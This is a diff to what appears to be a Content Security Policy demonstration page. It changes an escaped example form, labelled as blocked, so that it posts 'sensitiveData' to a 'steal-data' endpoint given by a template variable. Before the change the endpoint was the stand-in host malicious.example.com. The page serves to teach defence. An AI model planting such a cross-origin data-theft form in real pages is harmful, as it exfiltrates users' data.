@@ -104,7 +104,7 @@ document.getElementById('commentForm').addEventListener('submit', function(event
         <div class="code-section">
             <div class="code-header">Cross-Origin Form Submission (❌ BLOCKED)</div>
             <div class="code-content">
-                <pre><code>&lt;form action="http://malicious.example.com:3000/malicious/steal-data" 
+                <pre><code>&lt;form action="<%= maliciousUrl %>malicious/steal-data" 
       method="POST" target="_blank"&gt;
     &lt;input type="hidden" name="source" value="basic-csp.example.com"&gt;
     &lt;input type="text" name="sensitiveData" placeholder="Sensitive data" required&gt;
